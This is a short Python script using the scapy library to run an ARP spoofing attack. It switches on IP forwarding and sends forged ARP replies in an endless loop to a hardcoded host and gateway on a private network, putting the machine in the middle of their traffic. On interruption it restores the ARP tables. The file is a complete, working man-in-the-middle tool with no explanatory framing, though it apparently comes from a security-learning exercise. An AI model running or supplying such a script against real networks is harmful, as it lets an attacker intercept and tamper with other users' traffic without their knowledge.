#!/usr/bin/evn python

import scapy.all as scapy
import time
import subprocess



def get_mac(ip: str) -> str:
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_response_list = scapy.srp(arp_request_broadcast, timeout=10, verbose=False)[0]
    return answered_response_list[0][1].hwsrc

def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet, count=4, verbose=False)

def spoof(target_ip, spoof_ip, target_mac):
    # target_mac = get_mac(target_ip)
    # op = 2 means ARP response
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


sent_packets_count = 0
try:
    subprocess.run(["echo 1 > /proc/sys/net/ipv4/ip_forward"], shell=True)
    target_mac_1 = get_mac("10.24.51.170")
    target_mac_2 = get_mac("10.24.48.1")
    while True:
        spoof("10.24.51.170", "10.24.48.1", target_mac_1)
        spoof("10.24.48.1", "10.24.51.170", target_mac_2)
        sent_packets_count += 2
        print("\r[+] Packets sent:" + str(sent_packets_count), end="")
        time.sleep(10)
except:
    print("\nRestoring.........")
    restore("10.24.51.170", "10.24.48.1")
    restore("10.24.48.1", "10.24.51.170")
    subprocess.run(["echo 0 > /proc/sys/net/ipv4/ip_forward"], shell=True)
    print("Restored.")

